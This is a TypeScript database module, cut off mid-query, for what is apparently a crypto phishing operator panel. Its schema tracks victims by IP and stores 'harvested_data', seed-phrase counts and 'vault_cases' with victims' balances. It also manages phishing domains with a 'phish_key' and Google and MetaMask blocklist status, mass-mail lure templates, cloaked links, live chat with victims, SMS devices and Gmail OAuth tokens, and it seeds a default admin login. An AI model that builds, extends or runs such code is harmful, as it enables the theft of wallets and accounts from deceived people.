import Database from 'better-sqlite3';
import path from 'node:path';
import fs from 'node:fs';
import type { Visitor, LogEntry, Flow, HostConfig, UserAccount, CustomDomain, InboxAccount } from './state.js';

const DATA_DIR = path.resolve('data');
const DB_PATH = path.join(DATA_DIR, 'dashboard.db');

let db: Database.Database | null = null;

export function getDb(): Database.Database {
	if (db) return db;

	if (!fs.existsSync(DATA_DIR)) {
		fs.mkdirSync(DATA_DIR, { recursive: true });
	}

	db = new Database(DB_PATH);
	db.pragma('journal_mode = WAL');
	db.pragma('foreign_keys = ON');

	migrate(db);
	return db;
}

function migrate(db: Database.Database): void {
	db.exec(`
		CREATE TABLE IF NOT EXISTS visitors (
			ip TEXT PRIMARY KEY,
			flag TEXT NOT NULL DEFAULT '',
			city TEXT NOT NULL DEFAULT '',
			region TEXT NOT NULL DEFAULT '',
			country TEXT NOT NULL DEFAULT '',
			status TEXT NOT NULL DEFAULT 'offline',
			flow TEXT NOT NULL DEFAULT '',
			last_seen TEXT NOT NULL DEFAULT '',
			connected_at INTEGER NOT NULL DEFAULT 0,
			phrases INTEGER NOT NULL DEFAULT 0,
			accounts INTEGER NOT NULL DEFAULT 0,
			uploads INTEGER NOT NULL DEFAULT 0,
			platform TEXT NOT NULL DEFAULT 'crypto',
			device TEXT NOT NULL DEFAULT '',
			email TEXT NOT NULL DEFAULT '',
			module TEXT NOT NULL DEFAULT 'Coinbase',
			user_id TEXT NOT NULL DEFAULT '',
			user_agent TEXT NOT NULL DEFAULT '',
			browser TEXT NOT NULL DEFAULT '',
			last_page_route TEXT NOT NULL DEFAULT '',
			flow_bypassed INTEGER NOT NULL DEFAULT 0,
			captured_by TEXT NOT NULL DEFAULT '',
			last_two_digits TEXT NOT NULL DEFAULT ''
		);

		CREATE TABLE IF NOT EXISTS activity_log (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			message TEXT NOT NULL,
			time_str TEXT NOT NULL,
			timestamp INTEGER NOT NULL,
			type TEXT NOT NULL
		);

		CREATE TABLE IF NOT EXISTS flows (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			description TEXT NOT NULL DEFAULT '',
			steps TEXT NOT NULL DEFAULT '[]',
			active INTEGER NOT NULL DEFAULT 1
		);

		CREATE TABLE IF NOT EXISTS hosts (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			domain TEXT NOT NULL UNIQUE,
			active INTEGER NOT NULL DEFAULT 1,
			platform TEXT NOT NULL DEFAULT 'crypto',
			redirect_url TEXT NOT NULL DEFAULT '',
			last_updated TEXT NOT NULL DEFAULT ''
		);

		CREATE TABLE IF NOT EXISTS harvested_data (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			visitor_ip TEXT NOT NULL,
			flow TEXT NOT NULL DEFAULT '',
			data_type TEXT NOT NULL,
			data TEXT NOT NULL DEFAULT '{}',
			created_at INTEGER NOT NULL,
			captured_by TEXT NOT NULL DEFAULT ''
		);

		CREATE TABLE IF NOT EXISTS user_accounts (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT NOT NULL UNIQUE,
			password_hash TEXT NOT NULL DEFAULT '',
			role TEXT NOT NULL DEFAULT 'user',
			created_at TEXT NOT NULL DEFAULT '',
			last_login TEXT,
			active INTEGER NOT NULL DEFAULT 1
		);

		CREATE TABLE IF NOT EXISTS sessions (
			token TEXT PRIMARY KEY,
			user_id INTEGER NOT NULL,
			username TEXT NOT NULL,
			role TEXT NOT NULL,
			created_at INTEGER NOT NULL,
			expires_at INTEGER NOT NULL
		);

		CREATE TABLE IF NOT EXISTS custom_domains (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			domain TEXT NOT NULL UNIQUE,
			status TEXT NOT NULL DEFAULT 'pending',
			phish_key TEXT NOT NULL DEFAULT '',
			created_at TEXT NOT NULL DEFAULT '',
			module TEXT NOT NULL DEFAULT 'Coinbase',
			landing_page TEXT NOT NULL DEFAULT '/loading',
			kind TEXT NOT NULL DEFAULT 'regular',
			id_mode TEXT NOT NULL DEFAULT 'case_input',
			case_id TEXT NOT NULL DEFAULT '',
			under_attack INTEGER NOT NULL DEFAULT 0,
			serving INTEGER NOT NULL DEFAULT 1,
			google_safety TEXT NOT NULL DEFAULT 'unknown',
			metamask_safety TEXT NOT NULL DEFAULT 'unknown',
			cf_status TEXT NOT NULL DEFAULT 'unknown',
			cf_ns_primary TEXT NOT NULL DEFAULT '',
			cf_ns_secondary TEXT NOT NULL DEFAULT '',
			last_checked INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS inbox_accounts (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			email TEXT NOT NULL UNIQUE,
			provider TEXT NOT NULL DEFAULT 'IMAP',
			connected INTEGER NOT NULL DEFAULT 1,
			message_count INTEGER NOT NULL DEFAULT 0,
			storage_used INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS server_settings (
			key TEXT PRIMARY KEY,
			value TEXT NOT NULL DEFAULT ''
		);

		CREATE TABLE IF NOT EXISTS chat_messages (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT NOT NULL,
			message TEXT NOT NULL,
			time_str TEXT NOT NULL,
			timestamp INTEGER NOT NULL
		);

		CREATE TABLE IF NOT EXISTS mail_templates (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			slug TEXT NOT NULL UNIQUE,
			name TEXT NOT NULL,
			subject TEXT NOT NULL DEFAULT '',
			html TEXT NOT NULL DEFAULT '',
			variables TEXT NOT NULL DEFAULT '[]',
			owner_username TEXT NOT NULL DEFAULT '',
			shared INTEGER NOT NULL DEFAULT 0,
			created_at INTEGER NOT NULL DEFAULT 0,
			updated_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS protected_urls (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			short_code TEXT NOT NULL UNIQUE,
			original_url TEXT NOT NULL,
			domain TEXT NOT NULL DEFAULT '',
			clicks INTEGER NOT NULL DEFAULT 0,
			status TEXT NOT NULL DEFAULT 'active',
			owner_username TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0,
			expires_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS mailer_presets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			smtp_id TEXT NOT NULL DEFAULT '',
			template_slug TEXT NOT NULL DEFAULT '',
			sender_name TEXT NOT NULL DEFAULT '',
			sender_email TEXT NOT NULL DEFAULT '',
			reply_to TEXT NOT NULL DEFAULT '',
			subject TEXT NOT NULL DEFAULT '',
			send_mode TEXT NOT NULL DEFAULT 'smtp',
			owner_username TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS livechat_conversations (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			visitor_ip TEXT NOT NULL UNIQUE,
			module TEXT NOT NULL DEFAULT '',
			visit_count INTEGER NOT NULL DEFAULT 1,
			last_message_at INTEGER NOT NULL DEFAULT 0,
			last_message_preview TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0,
			active INTEGER NOT NULL DEFAULT 1
		);

		CREATE TABLE IF NOT EXISTS livechat_messages (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			conversation_id INTEGER NOT NULL,
			sender TEXT NOT NULL,
			author_name TEXT NOT NULL DEFAULT '',
			body TEXT NOT NULL,
			seen INTEGER NOT NULL DEFAULT 0,
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS vault_cases (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			visitor_ip TEXT NOT NULL UNIQUE,
			module TEXT NOT NULL DEFAULT '',
			location TEXT NOT NULL DEFAULT '',
			activity TEXT NOT NULL DEFAULT 'Sent seed ID',
			status TEXT NOT NULL DEFAULT 'Connected',
			balance_usd REAL NOT NULL DEFAULT 0,
			pending INTEGER NOT NULL DEFAULT 0,
			completed INTEGER NOT NULL DEFAULT 0,
			created_at INTEGER NOT NULL DEFAULT 0,
			updated_at INTEGER NOT NULL DEFAULT 0,
			captured_by TEXT NOT NULL DEFAULT ''
		);

		CREATE TABLE IF NOT EXISTS vault_assets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			vault_case_id INTEGER NOT NULL,
			symbol TEXT NOT NULL,
			amount REAL NOT NULL DEFAULT 0,
			usd_value REAL NOT NULL DEFAULT 0,
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS sms_devices (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			api_url TEXT NOT NULL,
			last_check INTEGER NOT NULL DEFAULT 0,
			last_status TEXT NOT NULL DEFAULT 'unknown',
			owner_username TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS gmail_accounts (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			label TEXT NOT NULL,
			email TEXT NOT NULL DEFAULT '',
			oauth_refresh_token TEXT NOT NULL DEFAULT '',
			oauth_access_token TEXT NOT NULL DEFAULT '',
			oauth_expires_at INTEGER NOT NULL DEFAULT 0,
			connected INTEGER NOT NULL DEFAULT 0,
			owner_username TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS gmail_links (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			label TEXT NOT NULL,
			oauth_state TEXT NOT NULL UNIQUE,
			used INTEGER NOT NULL DEFAULT 0,
			account_id INTEGER NOT NULL DEFAULT 0,
			owner_username TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE TABLE IF NOT EXISTS gmail_sender_presets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			sender_name TEXT NOT NULL DEFAULT '',
			sender_email TEXT NOT NULL DEFAULT '',
			avatar_url TEXT NOT NULL DEFAULT '',
			owner_username TEXT NOT NULL DEFAULT '',
			created_at INTEGER NOT NULL DEFAULT 0
		);

		CREATE INDEX IF NOT EXISTS idx_log_timestamp ON activity_log(timestamp DESC);
		CREATE INDEX IF NOT EXISTS idx_harvest_ip ON harvested_data(visitor_ip);
		CREATE INDEX IF NOT EXISTS idx_harvest_type ON harvested_data(data_type);
		CREATE INDEX IF NOT EXISTS idx_visitors_connected_at ON visitors(connected_at DESC);
		CREATE INDEX IF NOT EXISTS idx_visitors_status ON visitors(status);
		CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);
	`);

	addColumnIfMissing(db, 'visitors', 'email', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'visitors', 'module', "TEXT NOT NULL DEFAULT 'Coinbase'");
	addColumnIfMissing(db, 'visitors', 'user_id', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'visitors', 'user_agent', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'visitors', 'browser', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'visitors', 'last_page_route', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'visitors', 'flow_bypassed', "INTEGER NOT NULL DEFAULT 0");
	addColumnIfMissing(db, 'visitors', 'captured_by', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'visitors', 'last_two_digits', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'harvested_data', 'captured_by', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'user_accounts', 'password_hash', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'custom_domains', 'module', "TEXT NOT NULL DEFAULT 'Coinbase'");
	addColumnIfMissing(db, 'custom_domains', 'landing_page', "TEXT NOT NULL DEFAULT '/loading'");
	addColumnIfMissing(db, 'custom_domains', 'kind', "TEXT NOT NULL DEFAULT 'regular'");
	addColumnIfMissing(db, 'custom_domains', 'id_mode', "TEXT NOT NULL DEFAULT 'case_input'");
	addColumnIfMissing(db, 'custom_domains', 'case_id', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'custom_domains', 'under_attack', "INTEGER NOT NULL DEFAULT 0");
	addColumnIfMissing(db, 'custom_domains', 'serving', "INTEGER NOT NULL DEFAULT 1");
	addColumnIfMissing(db, 'custom_domains', 'google_safety', "TEXT NOT NULL DEFAULT 'unknown'");
	addColumnIfMissing(db, 'custom_domains', 'metamask_safety', "TEXT NOT NULL DEFAULT 'unknown'");
	addColumnIfMissing(db, 'custom_domains', 'cf_status', "TEXT NOT NULL DEFAULT 'unknown'");
	addColumnIfMissing(db, 'custom_domains', 'cf_ns_primary', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'custom_domains', 'cf_ns_secondary', "TEXT NOT NULL DEFAULT ''");
	addColumnIfMissing(db, 'custom_domains', 'last_checked', "INTEGER NOT NULL DEFAULT 0");

	db.exec(`CREATE INDEX IF NOT EXISTS idx_visitors_module ON visitors(module);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_domains_kind ON custom_domains(kind);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_domains_module ON custom_domains(module);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_templates_owner ON mail_templates(owner_username);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_purls_owner ON protected_urls(owner_username);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_purls_code ON protected_urls(short_code);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_presets_owner ON mailer_presets(owner_username);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_chat_conv ON livechat_messages(conversation_id, created_at);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_chat_unseen ON livechat_messages(conversation_id, seen, sender);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_vault_assets_case ON vault_assets(vault_case_id);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_sms_owner ON sms_devices(owner_username);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_owner ON gmail_accounts(owner_username);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_links_state ON gmail_links(oauth_state);`);
	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_presets_owner ON gmail_sender_presets(owner_username);`);

	seedDefaultAdmin(db);
}

function addColumnIfMissing(db: Database.Database, table: string, column: string, definition: string): void {
	const cols = db.prepare(`PRAGMA table_info(${table})`).all() as { name: string }[];
	if (!cols.some((c) => c.name === column)) {
		db.exec(`ALTER TABLE ${table} ADD COLUMN ${column} ${definition}`);
	}
}

export function dbSeedDefaultTemplates(templates: Array<{ id: string; name: string; subject: string; variables: string[]; html: string; by: string }>): void {
	const existing = getDb().prepare('SELECT COUNT(*) as c FROM mail_templates').get() as { c: number };
	if (existing.c > 0) return;
	const now = Date.now();
	const stmt = getDb().prepare(
		`INSERT OR IGNORE INTO mail_templates (slug, name, subject, html, variables, owner_username, shared, created_at, updated_at)
		 VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)`
	);
	for (const t of templates) {
		stmt.run(t.id, t.name, t.subject, t.html, JSON.stringify(t.variables), t.by || 'admin', now, now);
	}
	console.log(`[db] Seeded ${templates.length} default mail templates`);
}

function seedDefaultAdmin(db: Database.Database): void {
	const existing = db
		.prepare('SELECT id FROM user_accounts WHERE password_hash != ?')
		.get('') as { id: number } | undefined;
	if (existing) return;

	const username = process.env.ADMIN_USERNAME || 'ham';
	const password = process.env.ADMIN_PASSWORD || 'ham123';
	const hash = hashPassword(password);
	const created = new Date().toLocaleDateString('en-US', {
		month: 'short',
		day: 'numeric',
		year: 'numeric'
	});

	db.prepare(
		`INSERT INTO user_accounts (username, password_hash, role, created_at, active)
		 VALUES (?, ?, 'admin', ?, 1)
		 ON CONFLICT(username) DO UPDATE SET password_hash = excluded.password_hash`
	).run(username, hash, created);
	console.log(`[db] Seeded admin user "${username}" (set ADMIN_USERNAME / ADMIN_PASSWORD env to override)`);
}

import crypto from 'node:crypto';

export function hashPassword(password: string): string {
	const salt = crypto.randomBytes(16).toString('hex');
	const derived = crypto.scryptSync(password, salt, 64).toString('hex');
	return `scrypt$${salt}$${derived}`;
}

export function verifyPassword(password: string, stored: string): boolean {
	if (!stored.startsWith('scrypt$')) return false;
	const [, salt, derived] = stored.split('$');
	if (!salt || !derived) return false;
	try {
		const candidate = crypto.scryptSync(password, salt, 64);
		const expected = Buffer.from(derived, 'hex');
		return candidate.length === expected.length && crypto.timingSafeEqual(candidate, expected);
	} catch {
		return false;
	}
}

// --- Visitors ---

export function dbGetVisitors(): Visitor[] {
	const rows = getDb().prepare('SELECT * FROM visitors ORDER BY connected_at DESC').all() as any[];
	return rows.map(rowToVisitor);
}

export function dbUpsertVisitor(v: Visitor): void {
	getDb()
		.prepare(
			`INSERT INTO visitors (ip, flag, city, region, country, status, flow, last_seen, connected_at, phrases, accounts, uploads, platform, device, email, module, user_id, user_agent, browser, last_page_route, flow_bypassed, captured_by, last_two_digits)
			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
			 ON CONFLICT(ip) DO UPDATE SET
				flag=excluded.flag, city=excluded.city, region=excluded.region, country=excluded.country,
				status=excluded.status, flow=excluded.flow, last_seen=excluded.last_seen,
				connected_at=excluded.connected_at, phrases=excluded.phrases, accounts=excluded.accounts,
				uploads=excluded.uploads, platform=excluded.platform, device=excluded.device,
				email=excluded.email, module=excluded.module, user_id=excluded.user_id,
				user_agent=excluded.user_agent, browser=excluded.browser, last_page_route=excluded.last_page_route,
				flow_bypassed=excluded.flow_bypassed, captured_by=excluded.captured_by, last_two_digits=excluded.last_two_digits`
		)
		.run(
			v.ip, v.flag, v.city, v.region, v.country, v.status,
			v.flow, v.lastSeen, v.connectedAt, v.phrases, v.accounts,
			v.uploads, v.platform, v.device,
			v.email || '', v.module || 'Coinbase', v.userId || '', v.userAgent || '',
			v.browser || '', v.lastPageRoute || '', v.flowBypassed ? 1 : 0,
			v.capturedBy || '', v.lastTwoDigits || ''
		);
}

export function dbDeleteVisitor(ip: string): void {
	getDb().prepare('DELETE FROM visitors WHERE ip = ?').run(ip);
}

export function dbDeleteAllVisitors(): void {
	getDb().prepare('DELETE FROM visitors').run();
}

export function dbSetVisitorBypass(ip: string, bypassed: boolean): void {
	getDb().prepare('UPDATE visitors SET flow_bypassed = ? WHERE ip = ?').run(bypassed ? 1 : 0, ip);
}

export function dbSetVisitorLastTwo(ip: string, digits: string): void {
	getDb().prepare('UPDATE visitors SET last_two_digits = ? WHERE ip = ?').run(digits, ip);
}

export function dbSetVisitorLastPage(ip: string, route: string): void {
	getDb().prepare('UPDATE visitors SET last_page_route = ? WHERE ip = ?').run(route, ip);
}

export interface VisitorListQuery {
	page: number;
	limit: number;
	search?: string;
	module?: string;
	onlineOnly?: boolean;
	sort?: 'last_active' | 'email' | 'module';
	dir?: 'asc' | 'desc';
}

export function dbQueryVisitors(q: VisitorListQuery): { rows: Visitor[]; total: number } {
	const where: string[] = [];
	const params: any[] = [];
	if (q.onlineOnly) where.push("status = 'online'");
	if (q.search) {
		where.push('(ip LIKE ? OR email LIKE ? OR module LIKE ? OR last_page_route LIKE ?)');
		const like = `%${q.search}%`;
		params.push(like, like, like, like);
	}
	if (q.module) {
		where.push('module = ?');
		params.push(q.module);
	}

	const whereSql = where.length ? `WHERE ${where.join(' AND ')}` : '';
	const sortColMap = { last_active: 'connected_at', email: 'email', module: 'module' } as const;
	const sortCol = sortColMap[q.sort ?? 'last_active'];
	const dir = q.dir === 'asc' ? 'ASC' : 'DESC';
	const limit = Math.max(1, Math.min(100, q.limit || 20));
	const offset = Math.max(0, (q.page - 1) * limit);

	const totalRow = getDb()
		.prepare(`SELECT COUNT(*) as c FROM visitors ${whereSql}`)
		.get(...params) as { c: number };

	const rows = getDb()
		.prepare(`SELECT * FROM visitors ${whereSql} ORDER BY ${sortCol} ${dir} LIMIT ? OFFSET ?`)
		.all(...params, limit, offset) as any[];

	return {
		rows: rows.map(rowToVisitor),
		total: totalRow.c
	};
}

export function dbUpdateVisitorStatus(ip: string, status: string, lastSeen: string): void {
	getDb()
		.prepare('UPDATE visitors SET status = ?, last_seen = ? WHERE ip = ?')
		.run(status, lastSeen, ip);
}

export function dbUpdateVisitorFlow(ip: string, flow: string): void {
	getDb().prepare('UPDATE visitors SET flow = ? WHERE ip = ?').run(flow, ip);
}

export function dbIncrementVisitorField(ip: string, field: 'phrases' | 'accounts' | 'uploads'): void {
	getDb().prepare(`UPDATE visitors SET ${field} = ${field} + 1 WHERE ip = ?`).run(ip);
}

function rowToVisitor(row: any): Visitor {
	return {
		ip: row.ip,
		flag: row.flag,
		city: row.city,
		region: row.region,
		country: row.country,
		status: row.status as 'online' | 'offline',
		flow: row.flow,
		lastSeen: row.last_seen,
		connectedAt: row.connected_at,
		phrases: row.phrases,
		accounts: row.accounts,
		uploads: row.uploads,
		platform: row.platform,
		device: row.device,
		lastPage: row.last_page_route || '',
		lastPageRoute: row.last_page_route || '',
		flowSteps: [],
		inputs: {},
		wallets: [],
		screenSize: '',
		timezone: '',
		browser: row.browser || '',
		os: '',
		cpuCores: 0,
		email: row.email || '',
		module: row.module || 'Coinbase',
		userId: row.user_id || '',
		userAgent: row.user_agent || '',
		flowBypassed: !!row.flow_bypassed,
		capturedBy: row.captured_by || '',
		lastTwoDigits: row.last_two_digits || ''
	};
}

// --- Mail Templates ---

export interface DbMailTemplate {
	id: string;
	slug: string;
	name: string;
	subject: string;
	html: string;
	variables: string[];
	ownerUsername: string;
	shared: boolean;
	createdAt: number;
	updatedAt: number;
}

function rowToTemplate(row: any): DbMailTemplate {
	let variables: string[] = [];
	try {
		variables = JSON.parse(row.variables || '[]');
	} catch {
		variables = [];
	}
	return {
		id: String(row.id),
		slug: row.slug,
		name: row.name,
		subject: row.subject || '',
		html: row.html || '',
		variables,
		ownerUsername: row.owner_username || '',
		shared: !!row.shared,
		createdAt: row.created_at || 0,
		updatedAt: row.updated_at || 0
	};
}

export function dbGetTemplates(): DbMailTemplate[] {
	const rows = getDb().prepare('SELECT * FROM mail_templates ORDER BY updated_at DESC, id DESC').all() as any[];
	return rows.map(rowToTemplate);
}

export function dbGetTemplateBySlug(slug: string): DbMailTemplate | undefined {
	const row = getDb().prepare('SELECT * FROM mail_templates WHERE slug = ?').get(slug) as any;
	return row ? rowToTemplate(row) : undefined;
}

export function dbGetTemplateById(id: string): DbMailTemplate | undefined {
	const row = getDb().prepare('SELECT * FROM mail_templates WHERE id = ?').get(Number(id)) as any;
	return row ? rowToTemplate(row) : undefined;
}

export function dbInsertTemplate(t: Omit<DbMailTemplate, 'id'>): DbMailTemplate {
	const now = Date.now();
	const result = getDb()
		.prepare(
			`INSERT INTO mail_templates (slug, name, subject, html, variables, owner_username, shared, created_at, updated_at)
			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`
		)
		.run(
			t.slug,
			t.name,
			t.subject || '',
			t.html || '',
			JSON.stringify(t.variables || []),
			t.ownerUsername || '',
			t.shared ? 1 : 0,
			t.createdAt || now,
			t.updatedAt || now
		);
	return { ...t, id: String(result.lastInsertRowid) };
}

export function dbUpdateTemplate(id: string, patch: Partial<DbMailTemplate>): void {
	const map: Record<string, string> = {
		name: 'name',
		subject: 'subject',
		html: 'html',
		variables: 'variables',
		shared: 'shared'
	};
	const fields: string[] = [];
	const params: any[] = [];
	for (const [k, v] of Object.entries(patch)) {
		const col = map[k];
		if (!col) continue;
		fields.push(`${col} = ?`);
		if (k === 'variables') params.push(JSON.stringify(v));
		else if (k === 'shared') params.push(v ? 1 : 0);
		else params.push(v);
	}
	if (!fields.length) return;
	fields.push('updated_at = ?');
	params.push(Date.now(), Number(id));
	getDb().prepare(`UPDATE mail_templates SET ${fields.join(', ')} WHERE id = ?`).run(...params);
}

export function dbDeleteTemplate(id: string): void {
	getDb().prepare('DELETE FROM mail_templates WHERE id = ?').run(Number(id));
}

// --- Protected URLs ---

export interface DbProtectedUrl {
	id: string;
	shortCode: string;
	originalUrl: string;
	domain: string;
	clicks: number;
	status: 'active' | 'inactive';
	ownerUsername: string;
	createdAt: number;
	expiresAt: number;
}

function rowToProtectedUrl(row: any): DbProtectedUrl {
	return {
		id: String(row.id),
		shortCode: row.short_code,
		originalUrl: row.original_url,
		domain: row.domain || '',
		clicks: row.clicks || 0,
		status: row.status === 'inactive' ? 'inactive' : 'active',
		ownerUsername: row.owner_username || '',
		createdAt: row.created_at || 0,
		expiresAt: row.expires_at || 0
	};
}

export function dbGetProtectedUrls(ownerUsername?: string): DbProtectedUrl[] {
	const stmt = ownerUsername
		? getDb().prepare('SELECT * FROM protected_urls WHERE owner_username = ? ORDER BY created_at DESC')
		: getDb().prepare('SELECT * FROM protected_urls ORDER BY created_at DESC');
	const rows = (ownerUsername ? stmt.all(ownerUsername) : stmt.all()) as any[];
	return rows.map(rowToProtectedUrl);
}

export function dbGetProtectedUrlByCode(code: string): DbProtectedUrl | undefined {
	const row = getDb().prepare('SELECT * FROM protected_urls WHERE short_code = ?').get(code) as any;
	return row ? rowToProtectedUrl(row) : undefined;
}

export function dbInsertProtectedUrl(p: Omit<DbProtectedUrl, 'id'>): DbProtectedUrl {
	const result = getDb()
		.prepare(
			`INSERT INTO protected_urls (short_code, original_url, domain, clicks, status, owner_username, created_at, expires_at)
			 VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
		)
		.run(
			p.shortCode,
			p.originalUrl,
			p.domain || '',
			p.clicks || 0,
			p.status,
			p.ownerUsername || '',
			p.createdAt || Date.now(),
			p.expiresAt || 0
		);
	return { ...p, id: String(result.lastInsertRowid) };
}

export function dbUpdateProtectedUrl(id: string, patch: Partial<DbProtectedUrl>): void {
	const map: Record<string, string> = {
		originalUrl: 'original_url',
		status: 'status',
		expiresAt: 'expires_at',
		domain: 'domain'
	};
	const fields: string[] = [];
	const params: any[] = [];
	for (const [k, v] of Object.entries(patch)) {
		const col = map[k];
		if (!col) continue;
		fields.push(`${col} = ?`);
		params.push(v);
	}
	if (!fields.length) return;
	params.push(Number(id));
	getDb().prepare(`UPDATE protected_urls SET ${fields.join(', ')} WHERE id = ?`).run(...params);
}

export function dbIncrementProtectedUrlClicks(code: string): void {
	getDb().prepare('UPDATE protected_urls SET clicks = clicks + 1 WHERE short_code = ?').run(code);
}

export function dbDeleteProtectedUrl(id: string): void {
	getDb().prepare('DELETE FROM protected_urls WHERE id = ?').run(Number(id));
}

// --- Mailer Presets ---

export interface DbMailerPreset {
	id: string;
	name: string;
	smtpId: string;
	templateSlug: string;
	senderName: string;
	senderEmail: string;
	replyTo: string;
	subject: string;
	sendMode: 'smtp' | 'mail-server';
	ownerUsername: string;
	createdAt: number;
}

function rowToMailerPreset(row: any): DbMailerPreset {
	return {
		id: String(row.id),
		name: row.name,
		smtpId: row.smtp_id || '',
		templateSlug: row.template_slug || '',
		senderName: row.sender_name || '',
		senderEmail: row.sender_email || '',
		replyTo: row.reply_to || '',
		subject: row.subject || '',
		sendMode: row.send_mode === 'mail-server' ? 'mail-server' : 'smtp',
		ownerUsername: row.owner_username || '',
		createdAt: row.created_at || 0
	};
}

export function dbGetMailerPresets(ownerUsername?: string): DbMailerPreset[] {
	const stmt = ownerUsername
		? getDb().prepare('SELECT * FROM mailer_presets WHERE owner_username = ? ORDER BY created_at DESC')
		: getDb().prepare('SELECT * FROM mailer_presets ORDER BY created_at DESC');
	const rows = (ownerUsername ? stmt.all(ownerUsername) : stmt.all()) as any[];
	return rows.map(rowToMailerPreset);
}

export function dbInsertMailerPreset(p: Omit<DbMailerPreset, 'id'>): DbMailerPreset {
	const result = getDb()
		.prepare(
			`INSERT INTO mailer_presets (name, smtp_id, template_slug, sender_name, sender_email, reply_to, subject, send_mode, owner_username, created_at)
			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
		)
		.run(
			p.name,
			p.smtpId || '',
			p.templateSlug || '',
			p.senderName || '',
			p.senderEmail || '',
			p.replyTo || '',
			p.subject || '',
			p.sendMode || 'smtp',
			p.ownerUsername || '',
			p.createdAt || Date.now()
		);
	return { ...p, id: String(result.lastInsertRowid) };
}

export function dbDeleteMailerPreset(id: string): void {
	getDb().prepare('DELETE FROM mailer_presets WHERE id = ?').run(Number(id));
}

// --- Live Chat ---

export interface DbLivechatConversation {
	id: string;
	visitorIp: string;
	module: string;
	visitCount: number;
	lastMessageAt: number;
	lastMessagePreview: string;
	createdAt: number;
	active: boolean;
	unread: number;
}

function rowToConversation(row: any): DbLivechatConversation {
	return {
		id: String(row.id),
		visitorIp: row.visitor_ip,
		module: row.module || '',
		visitCount: row.visit_count || 1,
		lastMessageAt: row.last_message_at || 0,
		lastMessagePreview: row.last_message_preview || '',
		createdAt: row.created_at || 0,
		active: !!row.active,
		unread: row.unread || 0
	};
}

export function dbGetConversations(filter?: { activeOnly?: boolean; module?: string; search?: string }): DbLivechatConversation[] {
	const conds: string[] = [];
	const params: any[] = [];
	if (filter?.activeOnly) conds.push('c.active = 1');
	if (filter?.module) {
		conds.push('c.module = ?');
		params.push(filter.module);
	}
	if (filter?.search) {
		conds.push('(c.visitor_ip LIKE ? OR c.last_message_preview LIKE ? OR c.module LIKE ?)');
		const like = `%${filter.search}%`;
		params.push(like, like, like);
	}
	const where = conds.length ? `WHERE ${conds.join(' AND ')}` : '';
	const rows = getDb()
		.prepare(
			`SELECT c.*, (
